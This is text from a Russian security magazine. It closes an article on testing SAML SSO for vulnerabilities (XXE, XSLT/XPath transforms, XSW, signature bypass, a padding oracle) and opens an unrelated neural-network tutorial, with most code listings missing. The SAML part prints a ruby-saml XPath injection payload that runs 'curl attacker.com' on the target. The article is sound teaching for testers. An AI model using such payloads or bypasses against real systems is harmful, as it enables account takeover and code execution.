В сообщении Response содержатся утверждения (assertions), которые подпи-
саны провайдером (и, возможно, зашифрованы). Провайдер использует зна-
чение ACS URL из конфигурации SAML для этого приложения.
   Браузер запрашивает ACS URL и передает SAML Response в качестве пара-
метра запроса. Приложение проверяет подпись сообщения Response и под-
пись каждого assertion (и, возможно, расшифровывает assertion). Для этого
приложение использует сертификат провайдера, который хранится в конфи-
гурации SAML.
  Далее приложение на основе данных assertion создает сессию для пользо-
вателя, делает редирект браузера на страницу /app/profile и устанавливает
cookie с идентификатором сессии пользователя.

                                                                  Рис. 2. SAML
                                                                            SP-initiated flow





НАСТРАИВАЕМ SAML SSO В ПРИЛОЖЕНИИ
После того как мы разобрались с теорией, приступим к настройке SAML SSO
для тестируемого приложения. У нас есть развернутое приложение, теперь
нам нужен SAML IdP (провайдер). Я предпочитаю OneLogin, он популярен, и
многие приложения его поддерживают. Еще OneLogin предоставляет полез-
ные утилиты, которые тебе пригодятся при тестировании безопасности. Ути-
литы находятся здесь.
   Регистрируем бесплатный девелоперский аккаунт. Идем в APPS f Company
Apps, затем нажимаем кнопку Add Apps. В строке поиска необходимо на-
брать SAML Test Connector, как показано на рис. 3. Далее выбираем SAML Test
Connector (IdP w/attr).
Рис. 3. Создание тестового коннектора

Задаем имя для коннектора и нажимаем кнопку Save.
  На стороне нашего приложения идем в настройки SAML IdP (рис. 4). Нам
нужно скопировать значения полей Issuer, ACS URL, Logout URL. Эти три пара-
метра нам генерирует приложение, и они используются для настройки конне-
ктора на стороне IdP.





Рис. 4. Настройки SAML IdP приложения
Параметры, которые сгенерировало приложение, необходимо перенести в на-
стройки коннектора, как показано на рис. 5. На этом все, настройка коннекто-
ра завершена!

                                                                  Рис. 5. Настройка
                                                             коннектора





Переходим на вкладку SSO. Копируем значения X.509 certificate, Issuer URL,
SAML Endpoint и SLO Endpoint из настроек коннектора в настройки нашего при-
ложения (рис. 6).

                                                                  Рис. 6. Параметры
                                                      SSO
Далее необходимо создать пользователя в IdP. Для этого идем в Users f All
Users, как показано на рис. 7. Нажимаем кнопку New User.

                                                                  Рис. 7. Создание
                                                             пользователя на
                                                              стороне IdP





Создаем нового пользователя, указываем email и пароль. Переходим на вклад-
ку Applications и выбираем сконфигурированный нами коннектор (рис. 8).

                                                                  Рис. 8. Привязка
                                                             пользователя
                                                               к коннектору





В нашем приложении создаем пользователя с таким же email, так как связка
пользователей между IdP и нашим приложением осуществляется по email. На
этом настройка SAML SSO завершена.
   Когда мы пытаемся залогиниться в наше приложение, оно редиректит нас
к IdP на страницу логина — SAML 2.0 endpoint (см. конфигурацию коннектора
в OneLogin). После успешного логина пользователя на стороне IdP происходит
редирект в наше приложение на ACS URL. В параметре SAML Response пере-
дается закодированное в Base64 сообщение Response (рис. 9).

                                                                  Рис. 9. Передача
                                                   SAML Response
                                                              в приложение





Мы можем декодировать Response. Для этого используем эту утилиту (рис. 10):

                                                                  Рис. 10. URL decoding
А затем, используя эту утилиту, мы получим XML Response, которым подписан
IdP (рис. 11).





Рис. 11. Base64 decoding

Если SAML Response был сжат на стороне IdP, то для декодирования тебе нуж-
но использовать Base64 Decode + Inflate вместо Base64 Decode.
   Все, на этом процесс настройки и отладки SAML SSO завершен. Перехо-
дим к самому интересному — багам!

АРСЕНАЛ ДЛЯ ТЕСТИРОВАНИЯ SAML SSO
На данном этапе у тебя есть тестируемое приложение с работоспособным
SAML SSO. Разберемся, какие инструменты использовать для тестирования
безопасности.
   Конечно, в первую очередь утилиты с сайта, которые ранее упоминались:
•  раздел CODE/DECODE позволит тебе закодировать или декодировать со-
  общения SAML;
•  раздел SIGN позволит тебе подписать SAML-сообщения, используя се-
   кретный ключ;
•  раздел VALIDATE позволит тебе проверить подпись у SAML-сообщения;
•  раздел ENCRYPT/DECRYPT позволит тебе зашифровать или расшифро-
   вать SAML-сообщения, для расшифровки понадобится секретный ключ;
•  раздел EXAMPLES содержит примеры различных SAML-сообщений.

Если ты занимаешься веб-безопасностью, то, скорее всего, в твоем хакер-
ском арсенале есть Burp Suite. Я представлю два плагина, которые предна-
значены для тестирования SAML. Ты можешь использовать эти плагины даже
с бесплатной версией Burp Suite.
  Первый плагин — это SAML Editor, написан на Python. Для того чтобы он за-
работал, придется установить Jython standalone и указать в настройках Burp
Extender путь к Jython. Плагин очень простой, он добавляет дополнительную
табу с именем SAML, которая позволяет редактировать SAML-сообщения на
лету (рис. 12). Больше он ничего не умеет, его удобно использовать, чтобы
быстро отредактировать сообщение.

                                                                  Рис. 12. Плагин
                                                   SAML Editor





Второй плагин — это SAML Raider. Плагин написан на Java, можно его собрать,
используя Maven, либо скачать готовый jar-файл.
   Плагин добавляет новую табу с именем SAML Raider, которая позволяет
работать с подписями: удалять подписи, подписывать assertions и/или сооб-
щение SAML, используя импортированный или сгенерированный приватный
ключ и сертификат.
  Самое замечательное, что умеет плагин SAML Raider, — это тестировать
приложение на уязвимости XML Signature Wrapping (XSW). Поддерживаются
восемь типов XSW-атак (см. рис. 13).
Рис. 13. SAML Raider tab

Дополнительно плагин добавляет табу SAML Raider Certificates, которая по-
зволяет импортировать приватный ключ и сертификат, который затем можно
использовать для подписи assertions и SAML-сообщения. У плагина есть очень
полезная возможность — сгенерировать приватный ключ и сертификат, при
этом полностью скопировать поля из сертификата IdP в сгенерированный сер-
тификат. Для этого, находясь на табе SAML Raider, необходимо нажать кнопку
Send Certificate to SAML Raider Certs, затем перейти на вкладку SAML Raider
Certificates и нажать кнопку Clone, выбрав сертификат IdP (рис. 14).

                                                                  Рис. 14. SAML Raider
                                                                             Certificates tab
Рассмотренных инструментов будет достаточно для того, чтобы протестиро-
вать безопасность реализации SAML SSO в интересующем приложении.

ИЩЕМ УЯЗВИМОСТИ В SAML SSO
Самая интересная часть статьи — это какие уязвимости в реализации SAML
SSO ты можешь найти на стороне приложения. Поехали.

XXE повсюду
SAML-сообщения представляют собой XML. Это означает, что тестируемое
приложение потенциально подвержено уязвимостям, связанным с парсингом
XML. Сюда можно отнести уязвимости XML External Entities (XXE), Server-Side
Request Forgery (SSRF) и XML Entity Expansion (XEE, в массах более известна
как Billion Laughs attack).
   Эти уязвимости очень распространены, когда речь идет о парсинге XML. На
страницах Хакера про эти уязвимости не раз писали, поэтому я не буду подроб-
но на них останавливаться. Только порекомендую хорошую «методичку» по дан-
ным уязвимостям. Эти уязвимости работают, несмотря на то что SAML-сообще-
ние подписано, так как проверка подписи происходит уже после парсинга XML.
  Первым делом при тестировании безопасности SAML SSO нужно перехва-
тить сообщение Response и заменить его на следующее:
Хостнейм attacker.com нужно заменить на твой хостнейм, который доступен те-
стируемому приложению. Если у тебя нет публичного сервера, ты можешь вос-
пользоваться этим отличным сервисом. Он логирует все поступившие HTTP/
HTTPS-запросы.
   Если на attacker.com пришел GET-запрос, это означает, что приложение
уязвимо.

Преобразования и цифровая подпись
Стандарт цифровой подписи в XML предусматривает различные трансфор-
мации (преобразования) XML-документа перед его подписью. У элемента
<ds:Signature> есть дочерний элемент <ds:Transforms>, который содержит
несколько элементов <ds:Transform>. Каждый элемент <ds:Transform> опре-
деляет одно преобразование.
  Возможны следующие преобразования:
•  Enveloped signature — это вид XML-подписи, когда элемент <ds:Signature>
   с подписью помещается внутрь элемента, для которого вычисляется под-
   пись. Преобразование enveloped signature означает, что при вычисле-
   нии подписи для целевого элемента необходимо убрать из него элемент
   <ds:Signature>. То есть подпись вычисляется без <ds:Signature>;
•  C14N — преобразование, которое заключается в приведении XML-доку-
   мента к каноническому (логическому) виду (canonicalization) для XML версии
    1.0;
•  C14N11 — преобразование к каноническому виду для XML версии 1.1;
•  XPath — XPath-фильтрация, применяется, когда необходимо подписать
   определенную часть документа;
•  XSLT — преобразование подписываемого XML-документа на основе табли-
  цы стилей.

SAML IdP при формировании подписи проводит последовательность транс-
формаций. Проверяющая подпись сторона — наше приложение должно осу-
ществить ту же самую последовательность преобразований в процессе про-
верки валидности подписи.
Преобразования enveloped signature, С14N либо С14N11 являются обязатель-
ными, преобразования XPath и XSLT — опциональными. То есть проверяющая
подпись сторона может не поддерживать опциональные преобразования.
   Если код, осуществляющий проверку подписи в нашем приложении, под-
держивает XSLT-преобразование, это означает, что наше приложение, ско-
рее всего, уязвимо к различным атакам: исполнению кода (RCE), SSRF, досту-
пу к локальным файлам, DoS, разглашению конфигурационной информации.
Серьезность уязвимости зависит от используемой XSLT-библиотеки. Не буду
вдаваться в детали атак с использованием XSLT. Ограничусь ссылкой на вы-
ступление про практическую эксплуатацию XSLT-преобразований с конфе-
ренции OWASP Switzerland 2015.
   Как и в случае с уязвимым XML-парсингом, для совершения атак не нужно
специальных инструментов. Достаточно декодировать Response и добавить
элемент <ds:Transform>, который содержит дочерний элемент <xsl:stylesheet>.
Все трансформации выполняются до проверки подписи. Для проверки, под-
держивает ли наше приложение XSLT в подписи, можно использовать следую-
щее XSLT-преобразование:
Если на attacker.com пришел GET-запрос, это означает, что приложение под-
держивает XSLT.
  Надо отметить, что не все XSLT-библиотеки поддерживают обращение
к внешним ресурсам по протоколу HTTP/HTTPS. В этом случае можно исполь-
зовать следующее XSLT-преобразование:





Если приложение долго не отвечает, то оно поддерживает XSLT и уязвимо
к DoS-атакам.
   Когда приложение не поддерживает XSLT, но поддерживает XPath-преоб-
разование, оно уязвимо к DoS-атакам. Для того чтобы это проверить, можно
использовать следующее XPath-преобразование.





Если приложение отвечает дольше обычного, то оно поддерживает XPath.
XPath-инъекции
Еще одна интересная уязвимость — это XPath-инъекция. Рассмотрим, как
происходит проверка подписи SAML Response. Обычно код, осуществля-
ющий проверку подписи, ищет элемент <ds:Signature> и из дочернего эле-
мента <ds:Reference> извлекает атрибут URI. Затем использует значение
URI в XPath-выражении, наподобие //*[@ID=’aaa’], для поиска элемента
<saml:Assertion>, для которого требуется проверка подписи. В приведенном
примере XPath aaa — это идентификатор.
   Если приложение не производит проверку значения URI на наличие
XPath-конструкций при составлении выражения, то такая реализация уязвима
к XPath-инъекциям.
  Свежая XPath-инъекция найдена в конце 2015 года в ruby-saml. Ниже пред-
ставлена строка из xml_security.rb, которая стала причиной инъекции:




В случае с Ruby эта уязвимость приводит к RCE. Во всем виновата особенность
реализации XPath в Ruby, которая выполняет shell команды внутри обратных ка-
вычек. Если приложение использует ruby-saml, то для определения наличия уяз-
вимости необходимо в атрибут URI элемента подставить следующее значение:

#x’] or eval(‘`curl attacker.com`’) or /[@ID=’v

Если на хост attacker.com придет GET-запрос, то приложение уязвимо.

Атаки через сжатие сообщений SAML
IdP может сжимать сообщение SAML Response и затем его преобразовывать
в Base64. Поэтому тестируемое приложение может ожидать, что сообщение
придется распаковывать.
   Используя Python, мы можем получить закодированный SAML Response
(Deflate + Base64) следующим образом:





Если приложение поддерживает сжатие SAML-сообщения, то, скорее всего,
оно подвержено DoS-атакам.
   Сценарий атаки следующий. Атакующий декодирует SAML Response. Да-
лее в элемент <saml:Issuer> вставляет много «мусорных символов» и кодиру-
ет сообщение — сжимает и преобразует в Base64.
  Выбором «мусорных символов» можно добиться хорошей степени сжатия —
порядка 1000:1. Таким образом, мы можем сконструировать SAML Response
размером 10 Гбайт, который будет сжат в 10 Мбайт. Это, конечно, зависит от
настроек веб-сервера, но, как правило, веб-сервер приложения должен про-
пускать запрос с телом ~10 Мбайт.
   Распаковка и парсинг XML размером 10 Гбайт — занятие не из легких.

Ошибки при проверке подписи
При валидации подписи SAML Response потенциально существует много мест,
где приложение может «фатально» ошибиться, и в результате атакующий смо-
жет залогиниться под другим пользователем в приложение.
   Разработчик может заложить fail open логику в проверку подписи. То есть
если подписи нет, то приложение ее не проверяет и доверяет assertions, кото-
рые содержатся в сообщении Response. Мы можем имперсонироваться лю-
бым пользователем.
   Другой фейл, когда приложение берет сертификат IdP из элемента
<ds:Signature> в сообщении Response для проверки подписи. Атакующий мо-
жет сгенерировать свой приватный ключ и сертификат и затем подписать со-
общение приватным ключом, и сообщение пройдет валидацию подписи.
  Или приложение может брать сертификат IdP из элемента <ds:Signature>,
но проверять какие-то поля сертификата (за исключением Fingerprint). В этом
случае атакующий также генерирует приватный ключ и сертификат. При ге-
нерации сертификата он копирует поля, по которым происходит проверка из
оригинального сертификата IdP.
  При проверке подписи приложение должно брать сертификат из конфигу-
рации SAML и использовать его для валидации подписи, только так.
   Другая проблема — каким образом приложение проверяет валидность
сертификата IdP после установки. Сертификат IdP может закончиться или стать
скомпрометированным.
  В сообщении Response присутствуют несколько подписей — это подписи
отдельных assertions и подпись самого сообщения. Некоторые реализации
проверяют только подпись assertions и не проверяют подпись сообщения. Это
приводит к Reply-атакам. Дело в том, что assertion валиден некоторое время
(варьируется для каждого IdP), это задается значением атрибута NotOnOrAfter,
также сообщение Response имеет уникальный идентификатор. Это нужно для
того, чтобы юзер смог воспользоваться ответом IdP только один раз. Допу-
стим, что атакующий провел MITM-атаку или получил доступ к истории браузе-
ра жертвы и в результате смог получить SAML Response, с которым пользова-
тель логинился в приложение. Если приложение не проверяет подпись самого
сообщения, то атакующий сможет поменять уникальный ID сообщения и ис-
пользовать SAML Response (конечно, если срок SAML assertion не истек) для
того, чтобы залогиниться в приложение от имени пользователя.
   Отдельного внимания требуют XML Signature wrapping (XSW) атаки. О них
более подробно будет рассказано в следующем разделе.
   Уязвимости, связанные с проверкой подписи, удобно тестировать при по-
мощи плагина SAML Raider.

Атаки XSW
XSW — это атака на процедуру проверки подписи, она заключается в том, что
приложение проверяет подпись одних данных, а при обработке использует
другие. В контексте SAML данная атака позволяет атакующему, имеющему
учетную запись в приложении, аутентифицироваться как любой другой поль-
зователь.
   Предположим, что IdP подписывает только assertion и не подписывает само
сообщение. Наше приложение принимает Response, проверяет подпись
assertion и аутентифицирует пользователя. SAML Response показан на рис. 15.
При проверке подписи приложение ищет при помощи  XPath элемент
<saml:Assertion>, у которого атрибут ID равен значению abc.

                                                                  Рис. 15. Оригиналь-
                                                     ный SAML Response





Теперь попробуем модифицировать оригинальный SAML Response. До-
бавим  в  сообщение  элемент  <samlp:Extensions>,  который  содержит
<saml:Assertion> из оригинального сообщения. По спецификации SAML эле-
мент <samlp:Extensions> является необязательным и может содержать вну-
три себя любые элементы. Также в сообщение вместо оригинального элемен-
та <saml:Assertion ID = «abc»> мы вставляем свой элемент <saml:Assertion
ID =  «evil»>. В качестве подписи для <saml:Assertion  ID =  «evil»> мы
используем подпись для <saml:Assertion ID = «abc»>. После манипуляций
SAML Response выглядит, как показано на рис. 16.
  При проверке подписи приложение использует элемент <saml:Assertion
ID =  «abc»>, который является дочерним для <samlp:Extensions>. Проверка
подписи успешно проходит. Но для аутентификации пользователя приложе-
ние использует элемент <saml:Assertion ID = «evil»>. Это и есть XSW-атака.

                                                                  Рис. 16. Модифи-
                                                         цированный SAML
                                                             Response





Атаки на зашифрованные assertions
SAML позволяет шифровать assertions, если assertion содержит конфиден-
циальную информацию. SAML не позволяет шифровать отдельные атрибу-
ты, поэтому assertion шифруется целиком. Пример SAML Response с зашиф-
рованным assertion доступен здесь. В сообщение Response вместо элемента
<saml:Assertion> присутствует элемент <saml:EncryptedAssertion>, зашиф-
рованный и закодированный в Base64 assertion, а также симметричный ключ
шифрования, оба находятся внутри элементов <xenc:CipherData>.
  Для шифрования симметричного ключа шифрования используется алго-
ритм RSAES-PKCS1-v1_5. Для шифрования данных обычно используется блоч-
ный шифр (AES) в режиме CBC.
   Если при расшифровывании assertion приложение выступает в качестве
Оракула (Oracle), то после расшифровки оно сообщает о том, что padding не-
верный или расшифрованное сообщение не является валидным XML. Прило-
жение может сообщать это в виде явного сообщения об ошибке либо в виде
различного тайминга. Время расшифровывания assertion различается и когда
padding корректный, и когда он некорректный. В этом случае атакующий, пе-
рехвативший зашифрованный assertion, сможет его расшифровать даже без
знания ключа шифрования.
   Есть еще одно условие для проведения атаки на XML-шифрование: атаку-
ющий должен иметь возможность изменять зашифрованные данные. Подпись
сообщения проверяется раньше, чем расшифровываются данных. Поэтому
приложение должно быть уязвимо к ошибкам проверки подписи, которые были
рассмотрены ранее.
  Юрай Соморовски (Juraj Somorovsky) опубликовал работу, посвященную
атакам на XML-шифрование. В работе описан алгоритм, который позволит
атакующему расшифровать при выполнении двух условий: приложение уязви-
мо к ошибкам проверки подписи и приложение выступает в качестве Ораку-
ла. В среднем для расшифровки одного блока (в случае AES блок составляет
16 байт) шифротекста в среднем потребуется 162 запроса.
   Также в 2015 году Юрай Соморовски на конференции Black Hat EU предста-
вил утилиту WS-Attacker, которая реализует алгоритм из его работы про атаки
на XML-шифрование. Ссылка на презентацию тут. Я же опишу основные идеи
алгоритма.
   Процесс расшифровывания assertion выглядит, как это показано на рис. 17.
Предположим, что для шифрования используется AES-CBC (размер блока 16
байт).  Расшифрованный  i-й  блок  Pi  получается  следующим  образом:
Pi = Ci-1»D(k,Ci) = Ci-1»x. Ci-1 — обозначает i-1 блок шифротекста, Ci — обозна-
чает i блок шифротекста. Операция расшифровывания с использованием алго-
ритма AES обозначена как D(k,Ci), результат этой операции обозначен как x.

                                                                  Рис. 17. Операция
                                                        расшифровывания
                                                                       assertion при помо-
                                               щи блочного шифра
                                                              в режиме СВС





Рассмотрим, каким образом осуществляется паддинг при XML-шифровании.
Допустим, у нас есть следующий XML — <ABC/>. XML кодируется в UTF-8. То есть
мы получаем следующий закодированный XML (6 байт) — 0x3c 0x41 0x42 0x43
0x2f 0x3e. Блок шифрования для AES составляет 16 байт. Поэтому мы должны
использовать 10 байт паддинга — 0x3c 0x41 0x42 0x43 0x2f 0x3e 0x?? 0x??
0x?? 0x?? 0x?? 0x?? 0x?? 0x?? 0x?? 0x0A (0x?? означает любое значение бай-
та). Последний байт — это длина паддинга (равен 0x0A в нашем случае).
   Предположим, что мы хотим расшифровать блок шифротекста Ci (без зна-
ния ключа шифрования). Мы оставляем только блоки шифротекста с номера-
ми от 0 до i: C0, ...,  Ci. Далее мы модифицируем блок шифротекста Ci-1 осо-
бым образом и отправляем SAML Response приложению для расшифровки.
Наша задача — сделать такую модификацию Ci-1, чтобы при расшифровке на
стороне приложения получился валидный XML и паддинг был равен одному
байту (последний байт расшифрованного блока равен 0x01). Модифициро-
ванный блок Ci-1 обозначен как C~i-1.

                                                                  Рис. 18. Находим
                                                         модифицированное
                                                             значение C(i-1)





Если мы нашли C~i-1, то мы сможем вычислить последний байт Pi (или Pi[16])
расшифрованного блока (открытого текста). Сначала мы вычисляем x[16] (как
x[16] = 0x01C~i-1[16]. И затем Pi[16] = 0x01C~i-1[16]Ci-1[16].
  На следующем шаге мы получаем расшифрованное значение для осталь-
ных байтов (с 1-го по 15-й). Допустим, мы хотим вычислить Pi[3]. Для этого мы
добавляем (операция XOR) C~i-1[3] различные значения (назовем их «маски») и
смотрим ответ приложения — возвращается ли ошибка вследствие невалид-
ного XML или нет. Таким образом, прибавляя различные маски и анализируя
реакцию приложения, мы в конечном итоге вычисляем значение Pi[3].

ЗАКЛЮЧЕНИЕ
Итак, ты получил представление о том, каким уязвимостям подвержены при-
ложения с поддержкой SAML SSO. Ты узнал, каким образом настроить SSO
с помощью SAML в приложении, какие инструменты использовать для тести-
рования безопасности SAML SSO.
   Надеюсь, что теперь, если ты столкнешься с SAML SSO, будешь знать, куда
копать. Успешного багхантинга!
PC ZONE





                                                                      Олег Парамонов
                                                                               paramonov@sheep.ru МОЗГИ
 НАПРОКАТ        КАК СДЕЛАТЬ НЕЙРОСЕТЬ
    ИЛИ ВОСПОЛЬЗОВАТЬСЯ ЧУЖОЙ
Нейросети сейчас в моде, и не зря. С их помощью
можно, к примеру, распознавать предметы на картин-
ках или, наоборот, рисовать ночные кошмары Саль-
вадора Дали. Благодаря удобным библиотекам про-
стейшие нейросети создаются всего парой строк
кода, не больше уйдет и на обращение к искусствен-
ному интеллекту IBM.

Теория
Биологи до сих пор не знают, как именно работает мозг, но принцип действия
отдельных элементов нервной системы неплохо изучен. Она состоит из нейро-
нов — специализированных клеток, которые обмениваются между собой элек-
трохимическими сигналами. У каждого нейрона имеется множество дендритов
и один аксон. Дендриты можно сравнить со входами, через которые в нейрон
поступают данные, аксон же служит его выходом. Соединения между дендри-
тами и аксонами называют синапсами. Они не только передают сигналы, но
и могут менять их амплитуду и частоту.
   Преобразования, которые происходят на уровне отдельных нейронов, очень
просты, однако даже совсем небольшие нейронные сети способны на многое.
Все многообразие поведения червя Caenorhabditis elegans — движение, поиск
пищи, различные реакции на внешние раздражители и многое другое — зако-
дировано всего в трех сотнях нейронов. И ладно черви! Даже муравьям хватает
250 тысяч нейронов, а то, что они делают, машинам определенно не под силу.
Почти шестьдесят лет назад американский исследователь Фрэнк Розенблатт
попытался создать компьютерную систему, устроенную по образу и подобию
мозга, однако возможности его творения были крайне ограниченными. Инте-
рес к нейросетям с тех пор вспыхивал неоднократно, однако раз за разом вы-
яснялось, что вычислительной мощности не хватает на сколько-нибудь продви-
нутые нейросети. За последнее десятилетие в этом плане многое изменилось.

ЭЛЕКТРОМЕХАНИЧЕСКИЙ МОЗГ С МОТОРЧИКОМ





Машина Розенблатта называлась Mark  I Perceptron. Она предназначалась
для распознавания изображений — задачи, с которой компьютеры до сих пор
справляются так себе. Mark I был снабжен подобием сетчатки глаза: квадрат-
ной матрицей из 400 фотоэлементов, двадцать по вертикали и двадцать по го-
ризонтали. Фотоэлементы в случайном порядке подключались к электронным
моделям нейронов, а они, в свою очередь, к восьми выходам. В качестве си-
напсов, соединяющих электронные нейроны, фотоэлементы и выходы, Розен-
блатт использовал потенциометры. При обучении перцептрона 512 шаговых
двигателей автоматически вращали ручки потенциометров, регулируя напря-
жение на нейронах в зависимости от точности результата на выходе.
Вот в двух словах, как работает нейросеть. Искусственный нейрон, как и на-
стоящий, имеет несколько входов и один выход. У каждого входа есть весовой
коэффициент. Меняя эти коэффициенты, мы можем обучать нейронную сеть.
Зависимость сигнала на выходе от сигналов на входе определяет так называе-
мая функция активации.
  В перцептроне Розенблатта функция активации складывала вес всех вхо-
дов, на которые поступила логическая единица, а затем сравнивала результат
с пороговым значением. Ее минус заключался в том, что незначительное изме-
нение одного из весовых коэффициентов при таком подходе способно оказать
несоразмерно большое влияние на результат. Это затрудняет обучение.
  В современных нейронных сетях обычно используют нелинейные функции
активации, например сигмоиду. К тому же у старых нейросетей было слишком
мало слоев. Сейчас между входом и выходом обычно располагают один или
несколько скрытых слоев нейронов. Именно там происходит все самое инте-
ресное.
   Чтобы было проще понять, о чем
идет речь, посмотри на эту схему.
Это нейронная сеть прямого распро-
странения с одним скрытым слоем.
Каждый кружок соответствует нейро-
ну. Слева находятся нейроны входно-
го слоя. Справа — нейрон выходно-
го слоя. В середине располагается
скрытый слой с четырьмя нейронами.
Выходы всех нейронов входного слоя
подключены к каждому нейрону пер-
вого скрытого слоя. В свою очередь, входы нейрона выходного слоя связаны
со всеми выходами нейронов скрытого слоя.
  Не все нейронные сети устроены именно так. Например, существуют (хотя
и менее распространены) сети, у которых сигнал с нейронов подается не толь-
ко на следующий слой, как у сети прямого распространения с нашей схемы, но
и в обратном направлении. Такие сети называются рекуррентными. Полностью
соединенные слои — это тоже лишь один из вариантов, и одной из альтернатив
мы даже коснемся.

Практика
Итак, давай попробуем построить простейшую нейронную сеть своими руками
и разберемся в ее работе по ходу дела. Мы будем использовать Python с би-
блиотекой Numpy (можно было бы обойтись и без Numpy, но с Numpy линейная
алгебра отнимет меньше сил). Рассматриваемый пример основан на коде Эн-
дрю Траска.
  Нам понадобятся функции для вычисления сигмоиды и ее производной.





Роль Hello World в мире машинного обучения играет распознавание рукопис-
ных цифр по набору данных MNIST, состоящему из 60 тысяч образцов почерка,
но для наших целей это, увы, слишком. Мы займемся кое-чем попроще: попро-
буем найти зависимость между тремя входными значениями и одним выход-
ным. Вот набор данных для обучения сети.





Наша сеть будет устроена в точности так же, как на картинке: входной слой
с тремя нейронами, скрытый слой с четырьмя и выходной слой с одним. Ка-
ждая связь между нейронами (или, как говорят биологи, каждый синапс) имеет
весовой коэффициент. Мы будем хранить их в матрицах syn1 и syn2: первая со-
ответствует связям между входным и скрытым слоем, вторая — между скрытым
и выходным.
   Исходные значения весовых коэффициентов случайны. Небольшое поясне-
ние для тех, кто незнаком с Numpy: пара чисел, переданная numpy.random.
random, определяет размерность матрицы, которая будет создана и заполне-
на случайными числами.





Приготовления закончены, и можно перейти к делу. Остаток кода заключен
в цикл, который повторится 60 тысяч раз, пока мы обучаем сеть.
    l0 — это матрица, описывающая входной слой сети. Он совпадает с исходны-
ми данными. l1 соответствует скрытому слою сети. Чтобы узнать его значения,
мы перемножаем значения нейронов входного слоя (l0) и вес соединений между
входным и скрытым слоем (syn0), а затем пропускаем результаты через сигмо-
идную функцию. l2 соответствует выходному слою сети. Он считается по тому же
принципу, но с l1 вместо l0 и с syn1 вместо syn0. Вычисления происходят слева
направо: от входа к скрытому слою, а от скрытого слоя — к выходному.





Значения, которые сохранены в l2, — это сделанное нейронной сетью на ос-
нове входных данных предсказание результата. На первых порах его значение,
скорее всего, будет заметно отличаться от нужного. Чтобы исправить это, мы
должны пройти в обратном направлении, от выхода к входу, и скорректировать
вес соединений в соответствии с ошибкой.
   Сначала сравним результаты (l2) с целевыми значениями (y), а затем подго-
товимся к корректировке весовых коэффициентов. Значения в l2_delta зависят
от «уверенности» в соответствующих им результатах. Высокая уверенность ве-
дет к маленьким значениям и, соответственно, минимальному изменению ве-
сового коэффициента.





Повторим этот процесс для скрытого слоя (l1). Значения итоговых ошибок до-
стигают его не без потерь. Поскольку вклад нейронов скрытого слоя в ошибку
зависел от веса соединений (syn1), ошибка тоже пересчитывается с учетом ве-
совых коэффициентов.





Остается шаг, на котором, собственно говоря, и происходит обучение: пере-
считываем вес для каждого соединения.
Вот и все. Если бы слоев было больше, ошибка так и переходила бы от слоя
к слою, уменьшаясь в соответствии с весом соединений по мере приближения
к старту. Это называют обратным распространением ошибки (backpropagation).
   Очевидно, что наш подход к программированию многослойных нейронных
сетей, основанный преимущественно на операции copy-paste, не особенно
практичен. По-хорошему, сначала следовало бы позаботиться об абстракциях,
а еще лучше — не изобретать велосипед и поинтересоваться, не позаботились
ли о них другие.
  Даже если брать во внимание только Python, существует множество готовых
библиотек, предназначенных для реализации нейронных сетей и других алго-
ритмов машинного обучения. Хороший пример — библиотека Pybrain, сводя-
щая описание и обучение простой сети к трем строкам.





Суть описанного понятна без дополнительных объяснений. Это, к слову, ред-
кость: для освоения наиболее мощных программных средств, доступных в этой
области, требуются изрядные усилия.

Опасное погружение
Слово «глубинный» в модном термине «глубинное обучение», который не-
сколько лет назад вызвал всплеск интереса к нейронным сетям, намекает на
использование сетей с большим количеством скрытых слоев. Предполагается,
что при анализе данных каждый следующий слой будет извлекать из них все
более и более абстрактные особенности.
   Поскольку наша конечная цель — распознавание изображений, давай пого-
ворим о сверточных нейронных сетях. Это относительно новая разновидность
нейронных сетей, которая особенно эффективна именно для распознавания
изображений.
   У нейронной сети с полностью соединенными слоями, которую мы рассма-
тривали выше, входы каждого нейрона скрытого слоя соединены с выходами
всех нейронов входного слоя. В сверточной сети это не так. Тут нейроны скры-
того слоя соединены лишь с небольшой выборкой нейронов входного слоя,
причем каждый со своей.
   Это значит, что если сеть работает с изображениями и нейроны входного
слоя соответствуют его пикселям, то каждый нейрон скрытого слоя будет полу-
чать информацию лишь о небольшом участке изображения — например, фраг-
менте пять на пять пикселей. Участки соседних нейронов пересекаются, а все
вместе они полностью покрывают картинку.
  И это еще не все. Весовые коэффициенты соответствующих связей и сме-
щение (показатель, зависящий от порогового значения) каждого нейрона свер-
точного слоя полностью совпадают. По сути дела, все нейроны слоя действуют
как единственный нейрон, который рассматривает картинку через очень ма-
ленькое окошко со всех возможных сторон сразу.
  Набор общих весовых коэффициентов и смещение обычно называют филь-
тром. Фильтр предназначен для выявления одного признака — скажем, грани-
цы между объектами на изображении или, например, определенной текстуры.
Поскольку одного признака, как правило, мало, у одного слоя, занимающегося
сверткой, может быть несколько фильтров — по одному на распознаваемый
признак.
  За сверточным слоем обычно следует слой субдискретизации (pooling),
упрощающий полученные результаты. Этого можно достичь по-разному, но
нередко изображение, образованное результатами свертки, просто делят на
клетки и находят максимальное значение для каждой из них (max pooling). Ин-
формация о том, где именно был найден признак, при этом теряется, но она на
этом этапе уже не играет роли. Важнее сам факт, что признак найден, и положе-
ние этого признака относительно других. Комбинация сверточного слоя и слоя
субдискретизации часто повторяется несколько раз и увенчивается полностью
соединенным слоем, интегрирующим информацию со всего изображения.
  Пример простой сверточной сети есть все в том же Pybrain, а убедиться
в том, что она неплохо распознает изображения, можно при помощи примера
classify_image.py, прилагающегося к мощной библиотеке TensorFlow, которую
разработали в Google. Этот пример использует сеть, обученную на миллионах
изображений из базы данных ImageNet. Необходимые для ее работы данные
скрипт автоматически скачивает при первом запуске.

$ python classify_image.py --image_file cow.jpg

Эту сеть натренировали делить изо-
бражения по содержанию на тысячу
типов, и это очень специфическая ты-
сяча. classify_image.py прекрасно
разбирается в экзотических живот-
ных, но ничего не знает о людях. Если
продемонстрировать программе фо-
тографию коровы, она задумается на
несколько секунд, а потом предполо-
жит, что это вол или бык.
Это еще куда ни шло, а вот понимание
кадра, на котором запечатлены Путин
и Медведев, далось гугловской ней-
ронной сети с трудом. Она заметила
на фото мужской костюм (уверен-
ность — 64%), галстучный узел (5%)
и новобрачных (4%). В качестве де-
монстрации возможностей не так уж
плохо, но для того, чтобы использо-
вать эту программу на практике, по-
требуется существенная доработка.

Мозги напрокат
Времена, когда для распознавания образов нужно было становиться специа-
листом по машинному обучению, похоже, подходят к концу. Несколько меся-
цев назад компания Google объявила о начале закрытого бета-тестирования
веб-сервиса Google Cloud Vision API, к которому можно будет программно об-
ратиться для того, чтобы выяснить содержание картинки, выделить на ней от-
дельные объекты и лица или прочитать надписи.
